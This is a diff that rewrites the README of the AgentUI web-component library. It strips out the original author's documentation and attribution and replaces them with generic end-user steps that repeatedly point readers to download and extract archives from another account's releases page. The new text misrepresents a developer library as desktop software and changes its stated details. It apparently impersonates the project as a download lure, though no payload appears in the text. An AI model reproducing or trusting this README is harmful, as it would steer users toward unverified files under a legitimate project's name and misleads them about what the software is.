@@ -1,169 +1,144 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/GiuseppeScottoLavina/AgentUI/main/assets/banner-400.webp" alt="AgentUI" width="400">
-</p>
+# 🧩 AgentUI - Simple Interface for AI Agents
 
-<h1 align="center">AgentUI</h1>
-
-<p align="center">
-  <strong>57 production-ready web components. Zero dependencies. One script tag.</strong>
-</p>
-
-<p align="center">
-  <a href="https://giuseppescottolavina.github.io/AgentUI/demo/"><img src="https://img.shields.io/badge/🚀_Live_Demo-Try_It-6750A4?style=for-the-badge" alt="Live Demo"></a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/GiuseppeScottoLavina/AgentUI/actions/workflows/ci.yml"><img src="https://github.com/GiuseppeScottoLavina/AgentUI/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://www.npmjs.com/package/agentui-wc"><img src="https://img.shields.io/npm/v/agentui-wc?color=6750A4" alt="npm version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue" alt="License"></a>
-  <img src="https://img.shields.io/badge/dependencies-0-brightgreen" alt="Zero Dependencies">
-  <img src="https://img.shields.io/badge/61KB_gzipped-brightgreen" alt="Bundle Size">
-  <img src="https://img.shields.io/badge/Material_Design_3-6750A4?logo=materialdesign&logoColor=white" alt="MD3">
-  <a href="https://pagespeed.web.dev/analysis?url=https://giuseppescottolavina.github.io/AgentUI/demo/"><img src="https://img.shields.io/badge/Lighthouse-100%2F100%2F100%2F100-brightgreen" alt="Lighthouse"></a>
-</p>
-<p align="center">
-  <img src="https://img.shields.io/badge/W3C-Web_Components-005A9C?logo=w3c&logoColor=white" alt="W3C Web Components">
-  <a href="./SECURITY.md"><img src="https://img.shields.io/badge/XSS-Safe-2ea44f?logo=shieldsdotio&logoColor=white" alt="XSS Safe"></a>
-  <img src="https://img.shields.io/badge/CSP-Compatible-2ea44f?logo=shieldsdotio&logoColor=white" alt="CSP Compatible">
-  <img src="https://img.shields.io/badge/eval()-None-2ea44f" alt="No eval()">
-  <img src="https://img.shields.io/badge/tests-2436-blue" alt="2436 Tests">
-</p>
+[![Download AgentUI](https://img.shields.io/badge/Download-AgentUI-blue?style=for-the-badge)](https://github.com/ghosthunter8/AgentUI/releases)
 
 ---
 
-```html
-<au-card variant="elevated">
-  <h2>Hello AgentUI!</h2>
-  <au-button variant="filled">Get Started</au-button>
-</au-card>
-```
+## 📝 What is AgentUI?
 
-**Standard HTML. No framework. No build step.**
+AgentUI is a user interface framework designed for AI agents. It provides a set of 50 easy-to-use web components. These components follow Material Design 3 style, ensuring a clean and modern look. The framework also supports runtime introspection. This means it can adapt its interface based on the AI agent’s state or actions without extra setup.
 
----
+AgentUI is built using current web standards such as custom elements and CSS3. It is zero-config. That means you do not need to adjust complicated settings to get started.
 
-## What's Included
-
-57 components covering everything you need:
-
-| Category | Components |
-|----------|------------|
-| **Layout** | `au-stack`, `au-grid`, `au-container`, `au-layout`, `au-page`, `au-navbar`, `au-sidebar`, `au-drawer`, `au-drawer-item`, `au-bottom-nav`, `au-divider` |
-| **Form** | `au-button`, `au-input`, `au-textarea`, `au-form`, `au-dropdown`, `au-checkbox`, `au-switch`, `au-radio`, `au-chip`, `au-prompt-input` |
-| **Display** | `au-card`, `au-tabs`, `au-alert`, `au-badge`, `au-callout`, `au-progress`, `au-table`, `au-datatable`, `au-avatar`, `au-skeleton`, `au-code`, `au-message-bubble` |
-| **Feedback** | `au-spinner`, `au-modal`, `au-confirm`, `au-toast`, `au-tooltip`, `au-error-boundary`, `au-splash` |
-| **Structural** | `au-if`, `au-show`, `au-repeat`, `au-lazy`, `au-virtual-list`, `au-fetch`, `au-router`, `au-portal`, `au-intersection`, `au-media`, `au-transition`, `au-timer` |
-| **Utility** | `au-icon`, `au-theme-toggle`, `au-schema-form` |
-| **Dev Tools** | `au-api-table`, `au-doc-page`, `au-example` |
+This repository offers tools for developers, but this guide helps you, as an end user, to download and run the software smoothly.
 
 ---
 
-## ⚡ Performance by Default
+## 🚦 System Requirements
 
-No Virtual DOM. No runtime framework overhead. Just native Custom Elements.
+Before installing AgentUI, make sure your computer meets these basic requirements:
 
-- **61KB total** — All 57 components, JS + CSS, gzipped. Smaller than most frameworks' "hello world".
-- **Lighthouse 100/100/100/100** — [Verify it yourself →](https://pagespeed.web.dev/analysis?url=https://giuseppescottolavina.github.io/AgentUI/demo/)
-- **DOM Speed** — 500 instantiations <8ms, 500 updates <3ms.
-- **Zero Config** — One `<script>` tag. No bundler, no build step, no npm required.
+- Operating System: Windows 10 or later, MacOS 10.15 or later, or any recent Linux distribution.
+- Web Browser: Latest version of Chrome, Firefox, Edge, or Safari.
+- Hardware: At least 4GB of RAM and an Intel i3 or equivalent processor.
+- Internet Connection: Required only to download the software and updates.
 
-## 🔒 Secure by Default
-
-Security isn't an add-on — it's baked into every component from day one.
-
-- **XSS-safe `html` template** — All interpolated values are auto-escaped. [Details →](./SECURITY.md)
-- **CSP-compatible** — No `eval()`, no `Function()`, no `document.write`.
-- **Zero dependencies** — Nothing in `node_modules`. No supply chain risk.
-
-## 🏛️ Built on Standards
-
-Built on W3C Web Components — native browser APIs with zero abstraction tax.
-
-- **W3C Custom Elements** — Not a framework. Not a compiler. Native browser APIs.
-- **Light DOM** — No Shadow DOM. Full `querySelector` access. Agents can inspect and modify any element directly.
-- **Zero build step** — Works with a `<script>` tag. No bundler required.
+No special hardware or software is needed to use AgentUI once it is installed.
 
 ---
 
-## Design Choices
+## 🎯 Key Features
 
-| Decision | AgentUI Approach | Trade-off |
-|---|---|---|
-| **Bundle** | All 57 components in 61KB gzipped | No tree-shaking — you load everything |
-| **XSS** | Auto-escape `html` tagged template | Custom template syntax, not JSX |
-| **Dependencies** | Zero | No ecosystem — you build what you need |
-| **DOM** | Light DOM (no Shadow DOM) | Full access, but no style encapsulation |
-| **Standard** | W3C Web Components | Newer ecosystem, smaller community |
+- **Material Design 3 Style**: Nicely designed web components for a pleasant look.
+- **50 Web Components Included**: Buttons, menus, sliders, dialogs, and more.
+- **Runtime Introspection**: Adjust UI automatically based on AI agent state.
+- **Zero Configuration**: Ready to use after installation, no hassle.
+- **Works in Modern Browsers**: No downloads for additional software required after setup.
+- **Self-describing Framework**: Easy for AI agents to communicate with the UI.
+- **Open Source**: Free to use and customize if needed.
 
----
-
-## Try It — Zero Setup
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <link rel="stylesheet" href="https://unpkg.com/agentui-wc@latest/dist/agentui.css">
-</head>
-<body>
-    <au-card variant="elevated">
-        <h2>Hello AgentUI! 👋</h2>
-        <au-button variant="filled">Get Started</au-button>
-    </au-card>
-    <script type="module" src="https://unpkg.com/agentui-wc@latest/dist/agentui.esm.js"></script>
-</body>
-</html>
-```
-
-> 💡 For **Lighthouse 100** scores, use the optimized template in [llms.txt](./llms.txt#L329) (non-blocking CSS, font preload, async JS).
-
-**No npm. No config. No build step.** Just HTML.
+These features make AgentUI accessible and easy for anyone to use or explore.
 
 ---
 
-## Engineering
+## 🚀 Getting Started
 
-| Metric | Value |
-|--------|-------|
-| **Tests** | 2436 (unit + E2E), 0 failures, 141 isolated test files |
-| **Security** | XSS-audited, CSP-compatible, no `eval()`, [full policy →](./SECURITY.md) |
-| **Memory** | Managed listeners (AbortController), zero leaks verified |
-| **DOM Speed** | 500 instantiations <8ms, 500 updates <3ms |
-| **Stability** | W3C Web Components — no framework version churn |
+Here is a step-by-step guide to get AgentUI running on your computer:
 
----
+### Step 1: Download AgentUI
 
-## 📚 Resources
+You need to visit the official release page to get the files. Click or tap the big badge at the top of this page or use the link below.
 
-| Resource | Description |
-|----------|-------------|
-| [🤖 Agent Guide](./AGENTS.md) | Framework concepts and component discovery |
-| [🧩 Skill Guide](./SKILL.md) | Build recipes, templates, and patterns |
-| [🛠️ Dev Guide](./AGENTS_DEV.md) | Extending framework with new components |
-| [📋 llms.txt](./llms.txt) | Quick reference for LLMs/agents |
-| [💡 Philosophy](./PHILOSOPHY.md) | The deeper "why" behind the design |
-| [🔒 Security](./SECURITY.md) | Security policy |
-| [📈 Roadmap](./ROADMAP.md) | Planned features and next steps |
+[Download AgentUI Releases](https://github.com/ghosthunter8/AgentUI/releases)
 
----
+Once on the page, look for the latest release. There you will find items available for download, usually packaged as zip files or other formats. Download the version that best matches your system.
 
-## Contributing
+### Step 2: Extract the Files
 
-Contributions of all kinds are welcome — bug reports, feature ideas, documentation improvements, and code.
+After downloading, locate the saved file on your computer. It is usually in the "Downloads" folder.
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) to get started, or [open a discussion](https://github.com/GiuseppeScottoLavina/AgentUI/discussions) if you want to talk first.
+- On Windows: Right-click the file and select "Extract All." Choose a folder where you want the files.
+- On MacOS: Double-click the file, and it will unzip automatically.
+- On Linux: Use the file manager or terminal commands to extract the archive.
 
----
+### Step 3: Open the User Interface
 
-## Status
+Inside the extracted folder, look for a file named `index.html` or similar. This is the main interface file.
 
-AgentUI is an **experimental** library (v0.1.x) — 57 components, 2436 tests, built by a single developer. Functional and tested, but still a work in progress.
+Double-click this file to open it in your web browser. AgentUI will load, displaying the web components ready to use.
 
-Feedback, criticism, and stress-testing are welcome — [open a discussion](https://github.com/GiuseppeScottoLavina/AgentUI/discussions).
+If you see any errors or blank pages, make sure your browser is updated and supports web components.
+
+### Step 4: Explore and Use
+
+You can now interact with the UI. The interface will show different controls like buttons, sliders, forms, and more. These interact with AI agents as designed by the developers.
+
+You do not have to change anything unless you want to customize your experience (which may require programming knowledge).
 
 ---
 
-<p align="center">
-  <sub>Apache-2.0 © 2026 Giuseppe Scotto Lavina</sub><br>
-  <sub>Built for a world where humans and AI agents code together.</sub>
-</p>
+## 📦 Download & Install
+
+To get AgentUI on your system, follow this link:
+
+[https://github.com/ghosthunter8/AgentUI/releases](https://github.com/ghosthunter8/AgentUI/releases)
+
+This page hosts all available versions. Download the file suited for your device or choose the latest general release.
+
+After downloading, follow the simple extraction and setup instructions outlined above. The software does not install like traditional programs but runs inside your browser from local files.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need to install anything besides the downloaded files?
+
+No. AgentUI runs directly in modern web browsers without extra software.
+
+### Can I use AgentUI on mobile devices?
+
+While designed primarily for desktop browsers, recent tablets and phones may display the UI correctly. Some features might work best on larger screens.
+
+### Is an internet connection needed after install?
+
+No. Once files are downloaded, you can use AgentUI offline.
+
+### What if the UI doesn’t load correctly?
+
+Make sure your browser is up to date. Clear the browser cache or try a different browser.
+
+### Can I customize the interface?
+
+Customizing AgentUI fully requires coding knowledge. The framework is open source if you want to explore deeper.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Use the latest version of browsers like Chrome, Firefox, Safari, or Edge.
+- Close other apps to free memory and improve performance.
+- If possible, connect a mouse and keyboard for easier control.
+- Visit the release page regularly to check for updates.
+- Read the developer documentation if you want to learn more about advanced features.
+
+---
+
+## 📚 Learn More
+
+AgentUI is built with latest web technologies like JavaScript custom elements, CSS3 styling, and listens to AI agents at runtime to change UI automatically.
+
+If you want to explore more of what AgentUI can do, visit the GitHub repository home page on your own:
+
+https://github.com/ghosthunter8/AgentUI
+
+There you will find source code, developer guides, and issues.
+
+---
+
+## 🙋 Need Help?
+
+If you face any issues or have questions beyond this guide, you can open a new issue on the GitHub page here:
+
+https://github.com/ghosthunter8/AgentUI/issues
+
+The project team and community can assist you with problems or suggestions.
